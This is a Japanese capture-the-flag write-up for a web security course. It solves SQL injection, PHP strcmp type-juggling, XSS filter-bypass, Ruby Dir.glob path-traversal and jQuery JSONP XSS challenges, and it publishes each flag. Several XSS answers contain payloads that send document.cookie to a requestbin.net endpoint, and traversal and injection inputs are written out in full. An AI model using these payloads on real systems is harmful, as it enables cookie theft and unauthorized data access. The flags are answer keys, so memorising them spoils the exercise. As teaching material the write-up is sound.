# Web特講CTF Writeup

## Screw it (100pts)

SQLインジェクションの基本中の基本。コード中でSQL文を発行してるのは以下の箇所。

```php
$result = $db->query("
    SELECT *
    FROM users
    WHERE name = '$name' AND pass = '$pass'
");
```

`$name`および`$pass`に適切なエスケープが施されておらず、SQLインジェクションが可能である。

ペイロードに何の制限もない最も基本的なSQLiである。攻撃方法はいろいろと考えられるが、今回の目的はWHEREの条件文を満たすようにしてあげることなので、OR句を用いて必ず真になるような条件を付け足してあげれば良い。

例えばユーザー名を`' OR 1 = 1 -- ` (`--`のあとの空白に注意)、パスワードを空にしてあげれば、発行されるSQL文は

```sql
SELECT *
FROM users
WHERE name = '' OR 1 = 1 -- ' AND pass = ''
```

となり無事WHEREの条件文が真となりフラグを得られる。

ちなみに Time-based SQL Injection を用いれば既存のレコードを取得することもできる。

フラグ: `SWCTF{now_listening_natsu_owaranaide}`

楽曲: [夏、終わらないで。 - BiBi](https://open.spotify.com/track/5emxkWnR2aB7s3d0iZq6pm)

## Screw it 2 (100pts)

Screw it にゴルフ要素を足したもの。ユーザー名、パスワードともに3文字以内という制限が加えられる。

解法の一つは、例えばユーザー名を`'OR`、パスワードを`<>'`とすると、

```sql
SELECT *
FROM users
WHERE name = ''OR' AND pass = '<>''
```

となり、`' AND pass = ' <> ''`の条件を満たすのでクリアできる。ANDを含む部分をまるごと文字列にしてしまうのが味噌である。

なおこの問題の作問にあたっては以下のツイートを参考にした。最短で、ユーザー名1文字、パスワード2文字の解法が掲載されているので興味ある人はリンクを見ずにチャレンジしてみてほしい。

https://twitter.com/masa141421356/status/349045198300528642

フラグ: `SWCTF{now_listening_triangle_by_illumination_stars}`

楽曲: [トライアングル - イルミネーションスターズ](https://www.youtube.com/watch?v=Ela9WiovqgA)

## TOLO6 (304pts)

PHPの仕様をハックする問題。苦戦してる人がいて申し訳ないが、これは考えてどうにかなる問題ではなく、PHPの**やばい仕様**を調べて見つけられるかという問題である。

PHPは歴史ある言語なので、今では考えられないやばい挙動が多々あり、何も考えずに書くと罠を踏みがちである。

フラグを出すための条件分を見てみると、

```php
if (strcmp($_GET["number" . ($index + 1)], (string)$number) == 0) {
    $matches++;
}
```

となっている。[strcmp](https://www.php.net/manual/ja/function.strcmp.php)の説明を見ると「str1 が str2 よりも小さければ < 0 を、str1が str2よりも大きければ > 0 を、 等しければ 0 を返します。」とあり、一見脆弱性はなさそうだが、PHPのやばい挙動3つを組み合わせるとこの文をハックできる。

1. GETパラメーターのクエリ文字列の挙動

    クエリ文字列は`hoge=fuga`というのが通常の書き方だが、ここを`hoge[a]=fuga`などとするとネストされた値を記述することができる。この場合`$_GET["hoge"]`には`["a" => "fuga"]`という連想配列が突っ込まれる。

2. strcmpの型エラー時の挙動

    strcmp関数は通常数値を返すが、引数に文字列以外の値をとると、エラーとして`NULL`を返す。

3. PHPの`==`演算子の挙動

    PHPはJavaScriptなどと同じく比較演算子として`==`と`===`を持ち、前者は暗黙の型変換をともなう。すなわち`NULL`と`0`を`==`で比較すると、`NULL`が暗黙的に数値に変換され、`0`とみなされる。すなわち`NULL == 0`は真を返す。

以上により、クエリ文字列に`number1[hoge]=fuga`のような値を与えるとランダムな値を推測することなく条件を満たすことができる。最終的に以下のURLにアクセスするとフラグを得ることができる。

http://3.114.12.105:10030/?number1[0]=1&number2[0]=1&number3[0]=1&number4[0]=1&number5[0]=1&number6[0]=1

なおこの問題の作問にあたっては CPCTF 2019 のsekai67さん作問の問題を参考にした (すでにウェブサイトが消えていて確認できない)。

フラグ: `SWCTF{now_listening_funbare_runner}`

楽曲: [FUNBARE☆RUNNER - 777☆SISTERS](http://t7s.jp/release/ingame/17.html)

## Crosses (244pts)

制限のない最も単純なXSS。講義で伝えたとおり、requestbinなどを用いてCookieを転送すると楽である。

回答例

```html
<script>location.href="http://requestbin.net/r/s4dhc2s4?"+document.cookie</script>
```

フラグ: `SWCTF{now_listening_sakura_sunrise}`

楽曲: [Sakura Sunrise - Ryu☆](https://open.spotify.com/track/7jlhAusw6CrhVONeswcbuw)

## Crosses 2 (464pts)

出題ミスすみません⋯⋯。修正されて、ただのscriptという文字列を使えないXSS問になった。

イベントハンドラ系のHTML属性などを使用する。

回答例

```html
<img src=x onerror='location.href="http://requestbin.net/r/s4dhc2s4?"+document.cookie'>
```

フラグ: `SWCTF{now_listening_O-Ku-Ri-Mo-No_Sunday_M@STER_VERSION}`

楽曲: [O-Ku-Ri-Mo-No Sunday! - 久川凪、久川颯](https://www.youtube.com/watch?v=Fa1YczPNxYw)

## Crosses 3 (496pts)

実はこれも出題ミスである。`<iframe>`や`<svg>`などのBASE64エンコードを用いてscriptを埋め込むことを想定していたが、これらのコンテキストからCookieを取得することができなかったので使えない。

幸い、よく見るとonxxxxx系のチェックが甘いので簡単にバイパスすることができる。

回答例

```html
<img src=x onerror = 'location.href="http://requestbin.net/r/s4dhc2s4?"+document.cookie'>
```

フラグ: `SWCTF{now_listening_ai_wo_tsutaetaidatoka}`

楽曲: [愛を伝えたいだとか - あいみょん](https://www.youtube.com/watch?v=9qRCARM_LfE)

## Crosses 4 (464pts)

Crosses 2 と問題被ってない? よくないね

回答例

```html
x" onerror="location.href="http://requestbin.net/r/s4dhc2s4?"+document.cookie
```

フラグ: `SWCTF{now_listening_3_nen_C_gumi_kubosono_chiyoko_no_nyukaku}`

楽曲: [3年C組14番窪園チヨコの入閣 - 椎名もた feat. 鏡音リン](https://www.youtube.com/watch?v=bS18DC9mJpo)

## File Server (500pts)

Ruby問。問題のリンクを開くとくるくる回る博多市が現れるが、このページには何も情報がないので、とりあえずルートを開くと、app.rbというファイルが見えるので、とりあえず開く。

ソースコードが見られるので、これの挙動をよく観察しよう。`/tmp/flags`なるディレクトリに`flag.txt`を移動していることがわかるので、ディレクトリトラバーサルなどを用いてこのファイルを読むことがこの問題の目的と考えられる。ここではDir.globの非自明な挙動を2つ利用する。

まずは[Dir.globのリファレンス](https://ruby-doc.org/core-2.6.3/Dir.html#method-c-glob)をよく読もう!

1. Dir.globはNULLで区切られた文字列を配列とみなす

    まず、フラグのファイル名はランダムな値にセットされるので、このファイル名を取得する必要がある。

    実は、[Dir.globはNULLで区切られた文字列をパターンの配列とみなす。](https://docs.ruby-lang.org/ja/latest/method/Dir/s/=5b=5d.html)たとえば`Dir.glob("/hoge\0/fuga")`は`Dir.glob(["/hoge", "/fuga"])`と同じとみなされる。~~誰やねんこの挙動考えたの。~~実は12月にリリース予定の Ruby 2.7.0 で削除される予定なのだが、現在のバージョンではギリギリまだこの仕様が残っている。この挙動に関しては[CVE-2018-8780](https://nvd.nist.gov/vuln/detail/CVE-2018-8780)の[hackerone上のPoC](https://hackerone.com/reports/302338)でも言及されている。

    この挙動を用いると、ソースコード上のディレクトリトラバーサルのチェックを上手く回避し、`/tmp/flags`の下のファイルを上手く一覧することができる。

    例: http://3.114.12.105:10060/public%00/tmp/flags/ (※Chromeだと不正なURLと判定されるのでアクセスする際にはFirefoxやcurlを用いること)

    これでflagのファイル名を取得することができる。

2. Dir.globの特殊文字について

    ファイル名は分かったが、このままではファイルの中身を取得できない。ファイルを読む部分にはディレクトリトラバーサル対策などが施してないので、意気揚々と`/../../../../tmp/flags`にアクセスすると、無情に Bad Request で蹴られる。これはWEBRickにおいてディレクトリトラバーサルのようなURLは正規化した上で無効化されるからである [(参考)](https://github.com/ruby/webrick/blob/master/lib/webrick/httputils.rb#L31-L41)。

    これを回避するには、Dir.globの特殊文字を用いる。Dir.globの特殊文字はほとんどがエスケープされているが、`\`だけは用いることができる。これを使って以下のようにアクセスすると目的のファイルを得られる。

    例: http://3.114.12.105:10060/.%5C./.%5C./.%5C./.%5C./.%5C./tmp/flags/5a931c455aa2db18c6ba.txt

フラグ: `SWCTF{now_listening_algorithmic_everyday}`

楽曲: [アルゴリズミックえぶりでい - 暮井 慧](https://www.youtube.com/watch?v=2YZLMFKcIg0)

## Achievements Viewer (500pts)

誰にも解かれなかった。悲しいね。

長いソースコードをちゃんと読み込んで脆弱性を見つけられるかというのがわりと本質である。いろいろ読んでいくと、このあたりが怪しいことがわかる。

```js
async onHashChange() {
    const userId = location.hash.slice(1);
    if (userId) {
        this.userId = userId;
        await this.switchUser(userId);
    } else {
        this.userId = null;
        this.user = {};
    }
},
async switchUser(userId) {
    this.user = await $.getJSON(`${userId}.json`)
},
```

初期ロード時のハッシュの値 (=ユーザー入力) がそのままURLに入ってくる。怪しい。実際、以下のようなURLを作成することで任意のJSONをアプリに食わせることができる。

[http://3.114.12.105:10007/#https://api.github.com/users/hakatashi?](http://3.114.12.105:10007/#https://api.github.com/users/hakatashi?)

こうすると `userId === 'https://api.github.com/users/hakatashi?'` となり、getJSONには `$.getJSON('https://api.github.com/users/hakatashi?.json')` のような値が代入される。

このままJSONでいろんな値を食わせてあげてもいいが、Vueを使用している以上どんな値をbindしてもXSSは発生しそうにない。わざわざjQueryを使用してgetJSONなんて怪しい関数を呼び出している点を疑うべきである。

[$.getJSONのドキュメント](https://api.jquery.com/jQuery.getJSON/)をよく読んでみよう。以下の部分に注目。

> ### JSONP
>
> If the URL includes the string "callback=?" (or similar, as defined by the server-side API), the request is treated as JSONP instead. See the discussion of the jsonp data type in $.ajax() for more details.

なにやらけったいな仕様が存在することがわかる。JSONPとは古のクロスオリジンのデータ伝搬手法だが、要はscriptタグをページに挿入するので、怪しいURLを食わせたら即XSSとなる危険な代物である。この仕様を悪用して以下のようなURLを生成するとXSSが発火する。

[http://3.114.12.105:10007/#https://hakatashi.com/temp.js?callback=?&hoge](http://3.114.12.105:10007/#https://hakatashi.com/temp.js?callback=?&hoge)

あとは https://hakatashi.com/temp.js に攻撃用のペイロードを設置してAdminのブラウザに上のURLを転送するだけである。簡単簡単。

フラグ: `SWCTF{now_listening_Maria_walking_across_the_100000000_pieces}`

楽曲: [Maria Walking Across The 100000000 Pieces - ito-02](https://soundcloud.com/ito-02/yujurie-maria-walking-across-the-100000000-pieces)
